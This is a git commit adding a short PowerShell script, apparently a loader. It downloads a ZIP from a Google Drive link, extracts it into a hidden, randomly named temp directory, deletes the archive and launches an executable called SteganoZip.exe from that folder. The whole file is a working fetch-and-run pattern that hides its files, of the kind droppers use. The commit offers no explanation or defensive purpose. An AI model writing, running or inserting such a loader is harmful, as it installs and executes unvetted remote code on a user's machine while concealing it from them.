910a9473ff8b2d470481841a686aa9ac0b55dffd
cuunon9x <55404965+cuunon9x@users.noreply.github.com>
2024-09-17 23:50:00 +0700

    Create script.ps1

---
+++ script.ps1
@@ -0,0 +1,28 @@
+$url = "https://drive.usercontent.google.com/u/0/uc?id=1d6F_OkBI_WFa_oR0BUAHqBb7MQjgw0cB&export=download"
+$dir = [System.Guid]::NewGuid().ToString()
+$zipPath = "$env:temp\$dir.zip"
+$extractPath = "$env:temp\$dir"
+
+# Download the file
+(New-Object Net.WebClient).DownloadFile($url, $zipPath)
+
+# Create the extraction directory
+New-Item -Path $extractPath -ItemType Directory
+
+# Extract the ZIP file
+Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath
+
+# Hide the directory
+attrib +h $extractPath
+
+# Remove the ZIP file
+Remove-Item $zipPath
+
+# Optional sleep (depending on what you're waiting for)
+Start-Sleep -Seconds 3
+
+# Change location to the extracted directory
+Set-Location -Path $extractPath
+
+# Start SteganoZip (Ensure this executable exists in the extracted folder)
+Start-Process "$extractPath\SteganoZip.exe"
